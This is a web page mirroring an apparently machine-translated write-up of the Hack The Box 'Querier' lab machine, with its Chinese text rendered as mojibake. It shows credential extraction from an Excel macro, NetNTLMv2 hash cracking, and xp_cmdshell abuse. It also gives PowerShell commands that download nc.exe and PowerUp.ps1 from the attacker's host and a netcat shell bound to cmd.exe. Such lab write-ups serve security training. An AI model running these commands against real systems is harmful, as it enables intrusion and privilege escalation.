<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>ğŸ˜‹ ğŸ“™ ğŸ‘¨ğŸ½â€ğŸŒ¾ Pentestâ€œ Hackthebox-Querierâ€å®éªŒå®¤æœºå™¨é€šè¿‡ ğŸš ğŸ“® ğŸ…¿ï¸</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="å“ˆHaï¼ åœ¨æœ¬æ–‡ä¸­ï¼Œæ‚¨å°†å­¦ä¹ ä½¿ç”¨MsSQLçš„åŠŸèƒ½æ”»å‡»è¿œç¨‹æœåŠ¡å™¨ï¼Œåˆ›å»ºç”¨äºåœ¨ç³»ç»Ÿä¸­ä¿®å¤çš„åå‘å¤–å£³çš„æ–¹æ³•ï¼Œä»¥åŠåœ¨Windowsä¸­æ“ä½œé…ç½®é”™è¯¯çš„ç»„ç­–ç•¥çš„ç¤ºä¾‹ã€‚ 

 åœ¨åˆ‡å…¥ç‚¹ä¸‹ï¼Œæˆ‘ä»¬å°†è®¨è®ºåœ¨hacktheboxé—¨æˆ·ä¸Šä¼ é€’Querierå®éªŒå®¤æœºå™¨çš„ç»éªŒ ã€‚ 

 å¯¹äºé‚£äº›ä¸çŸ¥é“hacktheboxæ˜¯ä»€ä¹ˆçš„äºº...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Pentestâ€œ Hackthebox-Querierâ€å®éªŒå®¤æœºå™¨é€šè¿‡</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/post/465687/">å“ˆHaï¼ åœ¨æœ¬æ–‡ä¸­ï¼Œæ‚¨å°†å­¦ä¹ ä½¿ç”¨MsSQLçš„åŠŸèƒ½æ”»å‡»è¿œç¨‹æœåŠ¡å™¨ï¼Œåˆ›å»ºç”¨äºåœ¨ç³»ç»Ÿä¸­ä¿®å¤çš„åå‘å¤–å£³çš„æ–¹æ³•ï¼Œä»¥åŠåœ¨Windowsä¸­æ“ä½œé…ç½®é”™è¯¯çš„ç»„ç­–ç•¥çš„ç¤ºä¾‹ã€‚ <br><a name="habracut"></a><br> åœ¨<i>åˆ‡å…¥ç‚¹</i>ä¸‹ï¼Œæˆ‘ä»¬å°†è®¨è®ºåœ¨<i>hackthebox</i>é—¨æˆ·ä¸Šä¼ é€’<i>Querier</i>å®éªŒå®¤æœºå™¨çš„<i>ç»éªŒ</i> ã€‚ <br><br> å¯¹äºé‚£äº›ä¸çŸ¥é“hacktheboxæ˜¯ä»€ä¹ˆçš„äººæ¥è¯´ï¼Œè¿™æ˜¯ä¸€ä¸ªé—¨æˆ·ï¼Œæ‚¨å¯ä»¥åœ¨å…¶ä¸­æµ‹è¯•è‡ªå·±çš„ç¬”è¯•æŠ€èƒ½ï¼Œé‚£é‡Œæœ¬èº«å°±æœ‰CTFä»»åŠ¡å’Œå®éªŒå®¤æœºå™¨ã€‚ <br><br><div class="spoiler">  <b class="spoiler_title">å…è´£å£°æ˜</b> <div class="spoiler_text"> è¯¥æœåŠ¡çš„è§„åˆ™å¦‚ä¸‹ï¼šâ€œ <b>ä¸è¦ä¸å…¶ä»–æˆå‘˜å…±äº«æ‚¨å¦‚ä½•å…¥ä¾µæ¯å°è®¡ç®—æœºã€‚</b>  <b>è¿™åŒ…æ‹¬é‚€è¯·ä»£ç çš„äº§ç”Ÿå’Œæ‰€æœ‰çš„æŒ‘æˆ˜</b> ã€‚â€œ ä½†æ˜¯ï¼Œç”±äºè¯¥è®¡ç®—æœºä¸å†å¤„äºæ´»åŠ¨çŠ¶æ€ï¼Œå¹¶ä¸”å­˜å‚¨åœ¨â€œ <b>é€€ä¼‘è®¡ç®—æœºâ€</b>éƒ¨åˆ†ä¸­ï¼Œå› æ­¤åªæœ‰VIPæˆå‘˜æ‰èƒ½è®¿é—®å®ƒã€‚ <br></div></div><br><img src="https://habrastorage.org/webt/vq/ed/2p/vqed2pfxflqjfxvcwxqwoxlepjw.png"><br><br><h3> ä¿¡æ¯æ”¶é›† </h3><br> è®©æˆ‘ä»¬é€šè¿‡ä½¿ç”¨nmapå¯åŠ¨ç«¯å£æ‰«æå¼€å§‹æˆ‘ä»¬çš„æ¢ç´¢ã€‚ <br><br><pre><code class="plaintext hljs">nmap â€“sC â€“Pn â€“A 10.10.10.125</code> </pre> <br><img src="https://habrastorage.org/webt/ww/cq/cs/wwcqcsox6nngnzfkvkpgiyq07si.png"><br><br> æˆ‘ä»¬åˆ—å‡ºæ‰¾åˆ°çš„ç«¯å£ã€‚ <br><br><h3> åˆ—ä¸¾139/445 / tcpï¼ˆsmbï¼‰ </h3><br> æˆ‘ä»¬å°†ä½¿ç”¨smbclientå®ç”¨ç¨‹åºè®¿é—®SMBæœåŠ¡å™¨èµ„æºã€‚ <br><br><pre> <code class="plaintext hljs">smbclient â€“L //10.10.10.125</code> </pre> <br> æµè§ˆå®Œæ‰€æœ‰èµ„æºåï¼Œæˆ‘ä»¬åœ¨Reportsç›®å½•ä¸­æ‰¾åˆ°æ–‡ä»¶â€œ Currency Volume Report.xlsmâ€ã€‚ <br><br><img src="https://habrastorage.org/webt/op/c9/ap/opc9ap3a8hqwhveqvzz-xdh5e3i.png"><br><br> å¦‚æœä½¿ç”¨æ ‡å‡†Microsoft Excelæ‰“å¼€æ­¤æ–‡ä»¶ï¼Œåˆ™<s>ä¹ä¸€çœ‹</s>å®ƒä¼šå®Œå…¨ç©ºç™½ã€‚ <br><br> æˆ‘ä»¬ä½¿ç”¨<b><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">binwalk</a></b>å®ç”¨ç¨‹åºåˆ†ææ–‡ä»¶ï¼Œè¯¥å®ç”¨ç¨‹åºå°†å¸®åŠ©æ‚¨æŸ¥çœ‹xlsmæ–‡æ¡£çš„åµŒå…¥å¼æ–‡ä»¶ã€‚ <br><br><img src="https://habrastorage.org/webt/or/d3/de/ord3deo3azftc6ez9qpzmvitgje.png"><br><br> ä»binwalkçš„è¾“å‡ºä¸­ï¼Œæˆ‘ä»¬å‘ç°xlsmä¸­åŒ…å«ä¸€äº›æœ‰è¶£çš„æ–‡ä»¶ã€‚ <br> ä½¿ç”¨â€“eæ ‡å¿—ï¼Œå°†å…¶è§£å‹ç¼©ã€‚ <br><br><pre> <code class="plaintext hljs">binwalk â€“e Currency\ Volume\ Report.xlsm</code> </pre> <br><img src="https://habrastorage.org/webt/wi/vu/bq/wivubqmptbuto-wxlhlbyy58jh4.png"><br><br> ç°åœ¨ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨<b><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">å­—ç¬¦ä¸²</a></b>å®ç”¨ç¨‹åºæ¥è¾“å‡ºæ‰“å°çš„å­—ç¬¦ã€‚ æµè§ˆæ–‡ä»¶ï¼Œæˆ‘ä»¬åœ¨vbaProject.binä¸­æ‰¾åˆ°äº†æœ‰è¶£çš„æ•°æ®ã€‚ çœ‹æ¥æˆ‘ä»¬æ‰¾åˆ°äº†mssqlæœåŠ¡å™¨çš„å‡­æ®ã€‚ <br><br><img src="https://habrastorage.org/webt/am/8q/bx/am8qbx-ummecwgqgeewiixoy_sw.png"><br><br> æ€»ç»“å½“å‰æ”¶åˆ°çš„ä¿¡æ¯ï¼š <br><br><ul><li> æˆ‘ä»¬çŸ¥é“mssqlæœåŠ¡å™¨åœ¨ç«¯å£10.10.10.125:1433ä¸Šæ—‹è½¬ï¼› </li><li> æˆ‘ä»¬æœ‰æ¥è‡ªç”¨æˆ·mssqlæœåŠ¡å™¨çš„å‡­æ®ã€‚ </li></ul><br> å› æ­¤ï¼Œè®©æˆ‘ä»¬å°è¯•ä½¿ç”¨<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">impacket</a>æ¨¡å—ä¸­çš„è„šæœ¬è¿æ¥åˆ°æœåŠ¡å™¨ã€‚ <br><br><pre> <code class="plaintext hljs">python mssqlclient.py QUERIER/reporting:'PcwTWTHRwryjc$c6'@10.10.10.125 -windows-auth</code> </pre> <br> è·å–å¯¹MsSQLçš„è®¿é—®ã€‚ <br><br><img src="https://habrastorage.org/webt/2j/ff/ft/2jffftgea-_n4gr5ydykaye7epo.jpeg"><br><br><h3> æšä¸¾MsSQL </h3><br> æˆ‘ä»¬ä½¿ç”¨<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">æœ¬æ–‡ä¸­</a>çš„å‘½ä»¤åˆ—å‡ºäº†å¯¹æˆ‘ä»¬æœ‰ç”¨çš„ä¿¡æ¯ã€‚ <br> æ‰§è¡ŒSQLiä¹‹åï¼Œæˆ‘ä»¬ä»ç”¨æˆ·mssql-svcçš„å¯†ç ä¸­è·å¾—ä¸€ä¸ªå“ˆå¸Œå€¼ã€‚ <br><br><img src="https://habrastorage.org/webt/bs/d8/y2/bsd8y2jtdscxcuplenw3zctddsq.png"><br><br> è¦æ˜ç¡®è·å–å¯†ç ï¼Œå¿…é¡»ä½¿ç”¨ä»»ä½•æ–¹ä¾¿çš„å·¥å…·å°†å…¶åˆ é™¤ã€‚ <br><br><ol><li><pre> <code class="plaintext hljs">john --format=netntlmv2 hash.txt</code> </pre> </li><li><pre> <code class="plaintext hljs">hashcat -m 5600 -a 3 hash.txt</code> </pre> </li></ol><br>  <i>æˆ‘ä»¬ä»mssql-svcè·å¾—å¯†ç </i> ã€‚ <br><br> ä½¿ç”¨æ–°çš„å‡­è¯<s>è´·æ¬¾</s>è¿æ¥åˆ°SQLã€‚ <br><br><pre> <code class="plaintext hljs">python mssqlclient.py QUERIER/mssql-svc:'corporate568'@10.10.10.125 -windows-auth</code> </pre> <br> è¯¥ç”¨æˆ·çš„æƒé™å…è®¸æˆ‘ä»¬æ‰§è¡Œ<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">xp_cmdshell</a> <br><br><div class="spoiler">  <b class="spoiler_title">å…³äºxp_cmdshell</b> <div class="spoiler_text">  MsSQLé™„å¸¦äº†å¤§é‡é«˜çº§å­˜å‚¨è¿‡ç¨‹ã€‚ å…¶ä¸­æœ€æœ‰è¶£çš„æ˜¯xp_cmdshellã€‚ å®ƒæä¾›å¯¹æ“ä½œç³»ç»Ÿå‘½ä»¤è¡Œçš„è®¿é—®ã€‚ <br></div></div><br><h3> è·å¾—åå‘å£³ </h3><br> æˆ‘ä»¬æ­£åœ¨å°è¯•é€šè¿‡netcatè·å–å¤–å£³ï¼Œä¸ºæ­¤ï¼Œæˆ‘ä»¬éœ€è¦å°†å…¶ä¸Šä¼ åˆ°å—æ”»å‡»çš„æœåŠ¡å™¨ã€‚ <br><br> æˆ‘ä»¬è½¬åˆ°netcatæ‰€åœ¨æœºå™¨ä¸Šçš„ç›®å½•å¹¶è¿è¡Œï¼š <br><br><pre> <code class="plaintext hljs">python â€“m SimpleHTTPServer</code> </pre> <br> åœ¨mssql shellä¸­ï¼Œå°†netcatï¼ˆnc.exeï¼‰ä¸‹è½½åˆ°è¿œç¨‹æœåŠ¡å™¨ï¼Œè¿è¡Œpowershellå‘½ä»¤ï¼Œå¹¶æŒ‡å®šä¿å­˜è·¯å¾„ã€‚ <br><br><pre> <code class="plaintext hljs">xp_cmdshell "powershell.exe Invoke-WebRequest "http://10.10.xx:8000/nc.exe" â€“ OutFile "C:\Users\mssql-svc\Desktop\nc.exe" "</code> </pre><br> æˆ‘ä»¬å¯åŠ¨netcatæ¥ç›‘å¬ç«¯å£4444ã€‚ <br><br><pre> <code class="plaintext hljs">xp_cmdshell "powershell C:/Users/mssql-svc/Desktop/nc.exe -l -p 4444 -e cmd.exe"</code> </pre> <br> æˆ‘ä»¬ä»ä¸€è¾¹å¯åŠ¨netcatï¼ŒæŒ‡å®šå—æ”»å‡»æœåŠ¡å™¨çš„ipå’Œç«¯å£å¹¶è·å–shellã€‚ <br><br><pre> <code class="plaintext hljs">nc 10.10.10.125 4444</code> </pre> <br>  <a href="">ä»PowerShellMafia</a>è¿è¡Œ<a href="">è„šæœ¬</a>ä»¥å¢åŠ ç‰¹æƒã€‚ <br><br><pre> <code class="plaintext hljs">powershell.exe IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.xx:8000/PowerUp.ps1\"); Invoke-AllChecks</code> </pre> <br><img src="https://habrastorage.org/webt/2g/ae/ty/2gaety4o2quiuqhbyste0mxcwma.png"><br><br> è„šæœ¬çš„ç»“æœæ˜¯ï¼Œæˆ‘ä»¬è·å¾—äº†ç®¡ç†å‘˜å‡­æ®ã€‚ <br><br> æˆ‘ä»¬ä½¿ç”¨æ–°çš„å‡­æ®å’Œæƒé™è®¿é—®smbèµ„æºã€‚ <br><br><img src="https://habrastorage.org/webt/eg/sd/0q/egsd0qbpbkjkozjcu_e_qfxkujw.png"><br><br><img src="https://habrastorage.org/webt/vr/wb/w6/vrwbw6u9vmdn5af2zcyld-uoz60.png"><br><br> å–root.txtæ ‡å¿—ã€‚ èƒœåˆ©äº†ï¼ </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/zh-CN465687/">https://habr.com/ru/post/zh-CN465687/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../zh-CN465677/index.html">å¿˜æ‰éšèº«å¬å§ï¼ä¸€åˆ‡éƒ½ä¸è€³æœºæœ‰å…³</a></li>
<li><a href="../zh-CN465679/index.html">æ‰‹è¡¨é™¤äº†æ˜¾ç¤ºæ—¶é—´å¤–è¿˜å¯ä»¥åšä»€ä¹ˆï¼Œä»¥åŠå¦‚ä½•é€‰æ‹©æ‚¨çš„ç¬¬ä¸€åªæ‰‹è¡¨</a></li>
<li><a href="../zh-CN465681/index.html">åƒç«çš„crackå•ªå£°ä¸€æ ·ï¼Œé—¨çš„å±å±ä½œå“å’Œæœ€æ™®é€šçš„å£°éŸ³å˜æˆéŸ³ä¹ï¼Œå¹¶è½å…¥ç”µå£°è½¨é“</a></li>
<li><a href="../zh-CN465683/index.html">ç”µå½±çš„è¯…å’’ï¼šè°ä¸æ»¡æ„ç°ä»£ç”µè§†ä¸­çš„è¿åŠ¨å¹³æ»‘-æƒ…å†µå¦‚ä½•å‘å±•</a></li>
<li><a href="../zh-CN465685/index.html">ååº”æ¯ä¸ªå¼€å‘äººå‘˜éƒ½åº”è¯¥çŸ¥é“çš„æœ€ä½³å®è·µå’ŒæŠ€å·§ã€‚ ç¬¬ä¸€éƒ¨åˆ†</a></li>
<li><a href="../zh-CN465689/index.html">ä¿„ç½—æ–¯é“è·¯æ¨¡æ‹Ÿå™¨ï¼ˆRRSï¼‰ï¼šé¦–æ¬¡å…¬å¼€å‘å¸ƒ</a></li>
<li><a href="../zh-CN465691/index.html">åœ¨Pythonçš„ENM Ericssonä¸­ä½¿ç”¨REST</a></li>
<li><a href="../zh-CN465703/index.html">å¦‚ä½•é€šè¿‡äº¤æ˜“æ‰€è·å¾—å…¬å¸çš„é¢å¤–æ”¶å…¥ï¼šç»“æ„äº§å“æŠ•èµ„</a></li>
<li><a href="../zh-CN465709/index.html">JustCode-é€‚ç”¨äºWindowsä¸Šçš„å»‰ä»·è®¡ç®—æœºå’Œå¹³æ¿ç”µè„‘çš„é«˜é€Ÿæµè§ˆå™¨</a></li>
<li><a href="../zh-CN465711/index.html">GDPRå¦‚ä½•å¯¼è‡´ä¸ªäººæ•°æ®æ³„æ¼</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>